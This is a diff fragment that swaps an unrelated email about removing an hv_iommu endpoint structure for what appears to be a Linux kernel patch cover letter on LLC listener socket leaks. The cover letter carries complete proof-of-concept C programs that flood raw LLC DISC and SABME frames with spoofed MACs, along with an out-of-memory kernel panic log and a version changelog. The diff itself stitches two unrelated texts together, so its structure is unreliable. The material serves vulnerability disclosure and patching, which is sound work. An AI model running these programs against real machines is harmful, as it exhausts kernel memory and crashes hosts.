+		rx_if, tx_if, DEFAULT_SAP, count ? argv[3] : "0");
+	fprintf(stderr,
+		"listener_mac=%02x:%02x:%02x:%02x:%02x:%02x\n",
+		dst_mac[0], dst_mac[1], dst_mac[2],
+		dst_mac[3], dst_mac[4], dst_mac[5]);
+	fprintf(stderr,
+		"sending LLC DISC commands with a unique spoofed source MAC each time\n");
 
-This structure used to carry more per-device state. In v3, it also
-contained hv_domain, which tracked the currently attached domain and
-was used to skip a duplicate blocking domain attach. v4 removed the
-hv_domain field in struct hv_iommu_endpiont, and also the redundant
-ATS cleanup in release_device().
+	while (!count || i <= count) {
+		fill_src_mac(src_mac, i);
+		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
+			src_mac[ETH_ALEN - 1] ^= 1;
+		memcpy(frame + ETH_ALEN, src_mac, ETH_ALEN);
 
-Next, I will remove struct hv_iommu_endpoint, its allocation, the
-dev_iommu_priv_set()/get() calls, the release_device() callback, and
-the corresponding iommu_ops entry. hv_iommu_probe_device() can return
-&hv_iommu_device->iommu  directly.
+		if (sendto(packet_fd, frame, sizeof(frame), 0,
+			   (struct sockaddr *)&sll, sizeof(sll)) < 0)
+			die_errno("sendto(AF_PACKET)");
 
-If future work needs any per-device state, we can introduce the structure
-again. Keeping an unused data structure in the current code is indeed
-not a good practice. Thanks for pointing this out!
+		if (!(i % DEFAULT_REPORT_EVERY))
+			fprintf(stderr, "sent=%llu\n",
+				(unsigned long long)i);
+		i++;
+	}
 
-B.R.
-Yu
+	close(packet_fd);
+	close(listener_fd);
+	return 0;
+}
+------END poc.c--------
+
+------BEGIN poc-sabme.c------
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <linux/if.h>
+#include <linux/if_arp.h>
+#include <linux/if_ether.h>
+#include <linux/if_packet.h>
+#include <linux/llc.h>
+#include <net/ethernet.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#ifndef AF_LLC
+#define AF_LLC 26
+#endif
+
+#define DEFAULT_RX_IF "llc_rx0"
+#define DEFAULT_TX_IF "llc_tx0"
+#define DEFAULT_SAP 0xc0
+#define SABME_CMD 0x6f
+
+static void die_errno(const char *what)
+{
+	perror(what);
+	exit(EXIT_FAILURE);
+}
+
+static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
+{
+	struct ifreq ifr;
+	int fd = socket(AF_INET, SOCK_DGRAM, 0);
+
+	if (fd < 0)
+		die_errno("socket(AF_INET)");
+	memset(&ifr, 0, sizeof(ifr));
+	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
+	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
+		die_errno("ioctl(SIOCGIFHWADDR)");
+	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
+	close(fd);
+}
+
+static int get_ifindex(const char *ifname)
+{
+	struct ifreq ifr;
+	int fd = socket(AF_INET, SOCK_DGRAM, 0);
+
+	if (fd < 0)
+		die_errno("socket(AF_INET)");
+	memset(&ifr, 0, sizeof(ifr));
+	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
+	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
+		die_errno("ioctl(SIOCGIFINDEX)");
+	close(fd);
+	return ifr.ifr_ifindex;
+}
+
+static int make_listener(const char *ifname, uint8_t sap, unsigned char mac[ETH_ALEN])
+{
+	struct sockaddr_llc addr;
+	int fd = socket(AF_LLC, SOCK_STREAM, 0);
+
+	if (fd < 0)
+		die_errno("socket(AF_LLC)");
+	get_if_hwaddr(ifname, mac);
+	memset(&addr, 0, sizeof(addr));
+	addr.sllc_family = AF_LLC;
+	addr.sllc_arphrd = ARPHRD_ETHER;
+	addr.sllc_sap = sap;
+	memcpy(addr.sllc_mac, mac, ETH_ALEN);
+	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
+		die_errno("bind(AF_LLC)");
+	if (listen(fd, 16) < 0)
+		die_errno("listen(AF_LLC)");
+	return fd;
+}
+
+static int make_packet_socket(const char *ifname, int *ifindex_out)
+{
+	struct sockaddr_ll sll;
+	int one = 1;
+	int ifindex = get_ifindex(ifname);
+	int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+
+	if (fd < 0)
+		die_errno("socket(AF_PACKET)");
+	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));
+	memset(&sll, 0, sizeof(sll));
+	sll.sll_family = AF_PACKET;
+	sll.sll_protocol = htons(ETH_P_ALL);
+	sll.sll_ifindex = ifindex;
+	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
+		die_errno("bind(AF_PACKET)");
+	*ifindex_out = ifindex;
+	return fd;
+}
+
+static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
+{
+	mac[0] = 0x02;
+	mac[1] = (n >> 32) & 0xff;
+	mac[2] = (n >> 24) & 0xff;
+	mac[3] = (n >> 16) & 0xff;
+	mac[4] = (n >> 8) & 0xff;
+	mac[5] = n & 0xff;
+}
+
+static void send_sabme(int packet_fd, int ifindex, const unsigned char dst[ETH_ALEN],
+		       const unsigned char src[ETH_ALEN])
+{
+	static unsigned char frame[ETH_ZLEN];
+	struct sockaddr_ll sll;
+
+	memset(frame, 0, sizeof(frame));
+	memcpy(frame, dst, ETH_ALEN);
+	memcpy(frame + ETH_ALEN, src, ETH_ALEN);
+	((struct ethhdr *)frame)->h_proto = htons(3);
+	frame[ETH_HLEN + 0] = DEFAULT_SAP;
+	frame[ETH_HLEN + 1] = 0x04;
+	frame[ETH_HLEN + 2] = SABME_CMD;
+	memset(&sll, 0, sizeof(sll));
+	sll.sll_family = AF_PACKET;
+	sll.sll_ifindex = ifindex;
+	sll.sll_halen = ETH_ALEN;
+	memcpy(sll.sll_addr, dst, ETH_ALEN);
+	if (sendto(packet_fd, frame, sizeof(frame), 0,
+		   (struct sockaddr *)&sll, sizeof(sll)) < 0)
+		die_errno("sendto(AF_PACKET)");
+}
+
+static void usage(const char *prog)
+{
+	fprintf(stderr, "usage: %s accept|close [rx_if] [tx_if] [count]\n", prog);
+}
+
+int main(int argc, char **argv)
+{
+	unsigned char dst_mac[ETH_ALEN];
+	unsigned char src_mac[ETH_ALEN];
+	const char *mode;
+	const char *rx_if = DEFAULT_RX_IF;
+	const char *tx_if = DEFAULT_TX_IF;
+	uint64_t count = 1;
+	uint64_t i;
+	int listener_fd;
+	int packet_fd;
+	int ifindex;
+
+	if (argc < 2) {
+		usage(argv[0]);
+		return EXIT_FAILURE;
+	}
+	mode = argv[1];
+	if (argc > 2)
+		rx_if = argv[2];
+	if (argc > 3)
+		tx_if = argv[3];
+	if (argc > 4) {
+		char *end = NULL;
+
+		errno = 0;
+		count = strtoull(argv[4], &end, 0);
+		if (errno || !end || *end != '\0' || !count) {
+			fprintf(stderr, "invalid count: %s\n", argv[4]);
+			return EXIT_FAILURE;
+		}
+	}
+
+	listener_fd = make_listener(rx_if, DEFAULT_SAP, dst_mac);
+	packet_fd = make_packet_socket(tx_if, &ifindex);
+	fprintf(stderr, "mode=%s listener_if=%s sender_if=%s count=%llu\n",
+		mode, rx_if, tx_if, (unsigned long long)count);
+
+	if (!strcmp(mode, "accept")) {
+		int child;
+		struct sockaddr_llc addr;
+		socklen_t addrlen = sizeof(addr);
+		struct timeval tv = { .tv_sec = 5, .tv_usec = 0 };
+
+		fill_src_mac(src_mac, 1);
+		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
+			src_mac[ETH_ALEN - 1] ^= 1;
+		send_sabme(packet_fd, ifindex, dst_mac, src_mac);
+		setsockopt(listener_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+		child = accept(listener_fd, (struct sockaddr *)&addr, &addrlen);
+		if (child < 0)
+			die_errno("accept(AF_LLC)");
+		printf("SABME passive open accepted\naccept_rc=0\n");
+		close(child);
+		close(packet_fd);
+		close(listener_fd);
+		return 0;
+	}
+
+	if (!strcmp(mode, "close")) {
+		for (i = 1; i <= count; i++) {
+			fill_src_mac(src_mac, i);
+			if (!memcmp(src_mac, dst_mac, ETH_ALEN))
+				src_mac[ETH_ALEN - 1] ^= 1;
+			send_sabme(packet_fd, ifindex, dst_mac, src_mac);
+		}
+		close(packet_fd);
+		close(listener_fd);
+		printf("SABME sent without accept and listener closed\n");
+		return 0;
+	}
+
+	usage(argv[0]);
+	return EXIT_FAILURE;
+}
+------END poc-sabme.c--------
+
+------BEGIN leak sample------
+Original leak-only run on the unfixed kernel, 100 DISC frames, after the
+listener process had already exited:
+
+before: 0 leftover LLC sockets
+after 100 frames: 100 leftover entries remained in /proc/net/llc/socket
+
+Deleting the listener interface then stalled in unregister_netdevice
+because those children still held the device. The panic_on_oom log below
+is the later 110000-frame exhaustion of the 2 GB guest, not the leak
+oracle itself.
+------END leak sample--------
+
+----BEGIN crash log----
+[ 1665.704541][T10284] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
+
+[ 1665.705358][T10284] CPU: 0 UID: 0 PID: 10284 Comm: poc Not tainted 6.12.74 #3
+
+[ 1665.705911][T10284] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+
+[ 1665.706676][T10284] Call Trace:
+
+[ 1665.706943][T10284]  <TASK>
+
+[1665.707181][T10284] dump_stack_lvl (lib/dump_stack.c:105 (discriminator 2))
+
+[1665.707568][T10284] panic (kernel/panic.c:339 (discriminator 1))
+
+[1665.707918][T10284] ? dump_header (include/linux/rcupdate.h:815 (discriminator 1) mm/oom_kill.c:455 (discriminator 1) mm/oom_kill.c:478 (discriminator 1))
+
+[1665.708305][T10284] ? __pfx_panic (kernel/panic.c:277)
+
+[ 1665.708678][T10284]  ? srso_alias_return_thunk+0x5/0xfbef5
+
+[ 1665.709132][T10284]  ? srso_alias_return_thunk+0x5/0xfbef5
+
+[ 1665.709616][T10284]  ? out_of_memory+0x8c5/0x16b0
+
+[ 1665.710024][T10284]  out_of_memory+0x8f3/0x16b0
+
+[ 1665.710435][T10284]  ? __pfx_out_of_memory+0x10/0x10
+
+[ 1665.710868][T10284]  ? lock_acquire+0x2f/0xb0
+
+[ 1665.711243][T10284]  ? __alloc_pages_noprof+0xd59/0x26d0
+
+[ 1665.711712][T10284]  __alloc_pages_noprof+0x1ec3/0x26d0
+
+[ 1665.712184][T10284]  ? srso_alias_return_thunk+0x5/0xfbef5
+
+[ 1665.712658][T10284]  ? hlock_class+0x4e/0x130
+
+[ 1665.713041][T10284]  ? srso_alias_return_thunk+0x5/0xfbef5
+
+[ 1665.713501][T10284]  ? __pfx___alloc_pages_noprof+0x10/0x10
+
+[ 1665.713991][T10284]  ? __pfx___lock_acquire+0x10/0x10
+
+[ 1665.714431][T10284]  ? __sanitizer_cov_trace_switch+0x54/0x90
+
+[ 1665.714917][T10284]  ? srso_alias_return_thunk+0x5/0xfbef5
+
+[ 1665.715381][T10284]  ? policy_nodemask+0xf2/0x4f0
+
+[ 1665.715788][T10284]  alloc_pages_mpol_noprof+0x2ce/0x610
+
+[ 1665.716246][T10284]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
+
+[ 1665.716734][T10284]  ? srso_alias_return_thunk+0x5/0xfbef5
+
+[ 1665.717194][T10284]  ? srso_alias_return_thunk+0x5/0xfbef5
+
+[ 1665.717656][T10284]  ? xas_load+0x49/0x5b0
+
+[ 1665.718005][T10284]  ? filemap_get_entry+0xd5/0x3c0
+
+[ 1665.718439][T10284]  folio_alloc_noprof+0x23/0xd0
+
+[ 1665.718847][T10284]  filemap_alloc_folio_noprof+0x35d/0x420
+
+[ 1665.719316][T10284]  ? __pfx_filemap_alloc_folio_noprof+0x10/0x10
+
+[ 1665.719803][T10284]  ? filemap_fault+0x631/0x2800
+
+[ 1665.720231][T10284]  __filemap_get_folio+0x53e/0xaf0
+
+[ 1665.720683][T10284]  filemap_fault+0x675/0x2800
+
+[ 1665.721097][T10284]  ? __pfx_filemap_fault+0x10/0x10
+
+[ 1665.721534][T10284]  ? do_pte_missing+0x165a/0x3ff0
+
+[ 1665.721944][T10284]  ? __pfx_lock_release+0x10/0x10
+
+[ 1665.722375][T10284]  ? __pfx_filemap_map_pages+0x10/0x10
+
+[ 1665.722813][T10284]  __do_fault+0x10f/0x4a0
+
+[ 1665.723172][T10284]  ? __pfx_filemap_map_pages+0x10/0x10
+
+[ 1665.723621][T10284]  do_pte_missing+0x174c/0x3ff0
+
+[ 1665.724026][T10284]  ? srso_alias_return_thunk+0x5/0xfbef5
+
+[ 1665.724482][T10284]  ? reacquire_held_locks+0x20b/0x4c0
+
+[ 1665.724932][T10284]  ? lock_vma_under_rcu+0x143/0x980
+
+[ 1665.725374][T10284]  __handle_mm_fault+0xfa3/0x2a10
+
+[ 1665.725805][T10284]  ? __pfx_lock_release+0x10/0x10
+
+[ 1665.726207][T10284]  ? down_read_trylock+0x1f0/0x3f0
+
+[ 1665.726640][T10284]  ? __pfx___handle_mm_fault+0x10/0x10
+
+[ 1665.727085][T10284]  ? __pfx_down_read_trylock+0x10/0x10
+
+[ 1665.727574][T10284]  ? __pfx_lock_vma_under_rcu+0x10/0x10
+
+[ 1665.728053][T10284]  handle_mm_fault+0x3f5/0xa00
+
+[ 1665.728479][T10284]  do_user_addr_fault+0x50a/0x1490
+
+[ 1665.728921][T10284]  exc_page_fault+0x5d/0xe0
+
+[ 1665.729305][T10284]  asm_exc_page_fault+0x26/0x30
+
+[ 1665.729700][T10284] RIP: 0033:0x559e433ce5cb
+
+[ 1665.730065][T10284] Code: Unable to access opcode bytes at 0x559e433ce5a1.
+
+[ 1665.730594][T10284] RSP: 002b:00007ffcc17c93f0 EFLAGS: 00010206
+
+[ 1665.731148][T10284] RAX: 000000000000003c RBX: 00007ffcc17c9418 RCX: 0000559e433d10c6
+
+[ 1665.731733][T10284] RDX: 000000000000002c RSI: 0000559e433d10c0 RDI: 0000000000000004
+
+[ 1665.732318][T10284] RBP: 00007ffcc17c9412 R08: 00007ffcc17c9420 R09: 0000000000000014
+
+[ 1665.732904][T10284] R10: 0000000000000000 R11: 0000000000000202 R12: 0000559e433d10c6
+
+[ 1665.733491][T10284] R13: d288ce703afb7e91 R14: 0000000000019194 R15: 0000000000000004
+
+[ 1665.734120][T10284]  </TASK>
+-----END crash log-----
+
+changes in v7:
+  - Drop the companion LLC_CONN_OUT_OF_SVC bounds patch due to overlap with
+    Kees Cook's net-next series:
+    https://lore.kernel.org/all/20260901210300.i.590-kees@kernel.org/
+  - That series also covers the connect(2) +1 return and rejecting
+    out-of-service states before table lookup, as raised in review of
+    v6 2/2:
+    https://lore.kernel.org/all/20260902010052.2297527-1-kuba@kernel.org/
+  - Keep only the listener child leak fix for net.
+  - Fix reverse-xmas-tree local ordering in llc_conn_handler() and
+    llc_incoming_sock_work(), align the atomic_cmpxchg() continuation,
+    and add matching braces on the backlog retry if/else.
+  - Release a PENDING child when llc_conn_handler() sees a redirected
+    packet for a TCP_LISTEN socket that is already SOCK_DEAD, instead of
+    dropping the packet and leaving that cleanup only to close().
+  - Keep the init_net CAP_NET_RAW/CAP_NET_ADMIN reproducer; PF_LLC is
+    rejected outside init_net, so unshare -Urn cannot express this path.
+  - Spell out that the crash PoC is DISC-only, include poc-sabme.c for
+    the accept and close paths, and restore the full OOM panic so the
+    leftover /proc/net/llc/socket leak is described next to that log.
+  - Do not tear down an already pending child when a redirected frame
+    fails sk_add_backlog(); drop that frame only.
+  - Track incoming children on the listener and release leftover PENDING
+    sockets from that list on close(), instead of relying only on
+    sk_receive_queue, backlog drain, or a later SOCK_DEAD packet.
+  - Stop taking the listener lock in llc_incoming_sock_work(); the child
+    already holds the listener, and teardown no longer interleaves with
+    llc_ui_release()'s llc_sk_free().
+  - Hold a child socket reference on handshake skbs with
+    skb_set_owner_sk_safe(), so kfree_skb() cannot race asynchronous
+    teardown through sock_rfree().
+  - Finish sock_orphan() and the device put in llc_incoming_sock_work()
+    before llc_sk_free(), so those steps do not run after its sock_put().
+  - Keep the v1 lore Link on its own line, before the numbered-patch
+    diffstat.
+  - Include the original leak-only leftover /proc/net/llc/socket count
+    next to the later panic_on_oom log.
+  - v6 Link: https://lore.kernel.org/all/cover.1787752861.git.zihanx@nebusec.ai/
+changes in v6:
+  - Hold a reference for children queued for accept() and release it when they
+    are dequeued, while retaining SAP publication so tuple lookup still finds
+    a pending child before the passive open completes.
+  - Make direct receive, backlog, accept-queue, and listener-close cleanup
+    symmetric, with bottom-half-disabled child locking in process context.
+  - Keep the LLC_CONN_OUT_OF_SVC lower-bound check in its separate patch and
+    use the ADM state boundary consistently.
+  - v5 Link: https://lore.kernel.org/all/20260822082354.3109-1-zihanx@nebusec.ai/
+changes in v5:
+  - Make listener child cleanup unconditional so queued children are also
+    released if the socket leaves TCP_LISTEN before close.
+  - Serialize process-context child cleanup and backlog dispatch with bottom
+    halves disabled, avoiding child-lock acquisition races with LLC receive
+    and timer paths.
+  - Drop packets redirected through a pending child after its listener is no
+    longer listening, and release children left out of service instead of
+    dispatching them.
+  - Split the LLC_CONN_OUT_OF_SVC lower-bound check into a separate patch.
+  - v4 Link: https://lore.kernel.org/all/20260814185843.4748-1-zihanx@nebusec.ai/
+changes in v4:
+  - Create a passive-open child only for SABME and generate listener-side DM
+    replies directly for non-SABME commands.
+  - Use an atomic incoming-child lifecycle and serialize pending-child lookup,
+    backlog processing, rollback, and listener close with the child lock.
+  - Keep immediate SAP publication for passive-open tuple matching, but release
+    unaccepted children on direct and backlog failures and on listener close.
+  - Defer final incoming-child cleanup to workqueue context so timer
+    synchronization does not run in the receive softirq path.
+  - Add an LLC state lower-bound check before state-table dispatch.
+  - v3 Link: https://lore.kernel.org/all/20260805175945.10698-1-zihanx@nebusec.ai/
+changes in v3:
+  - Drop the unused llc_conn_handler() local rc variable reported in review.
+  - Rebase the numbered patch and cover onto commit
+    ede76849012e45ffb2193ad110b42027eec02c5c.
+  - v2 Link: https://lore.kernel.org/all/cover.1785386749.git.zihanx@nebusec.ai/
+changes in v2:
+  - Rework the fix to preserve the existing passive-open tuple matching
+    semantics instead of deferring child publication until LLC_CONN_PRIM.
+  - Track listener-created children pending publication to accept(), and roll
+    them back on every earlier failure or drop path.
+  - Cover the original non-SABME leak and SABME paths which fail before
+    LLC_CONN_PRIM, including backlog enqueue and backlog drop failures.
+  - Correct Fixes to 1da177e4c3f4 ("Linux-2.6.12-rc2") based on the earliest
+    locally visible history carrying the same root-cause fact.
+  - Clarify panic_on_oom crash evidence and packetdrill selection.
+  - v1 Link: https://lore.kernel.org/all/cover.1784725007.git.zihanx@nebusec.ai/
+
+Best regards,
+Zihan Xi
+
+Zihan Xi (1):
+  llc: fix listener child socket leaks before passive open completes
+
+ include/net/llc_conn.h |  15 +-
+ net/llc/af_llc.c       |  22 ++-
+ net/llc/llc_conn.c     | 312 +++++++++++++++++++++++++++++++++++++++--
+ 3 files changed, 335 insertions(+), 14 deletions(-)
+
+-- 
+2.43.0
 
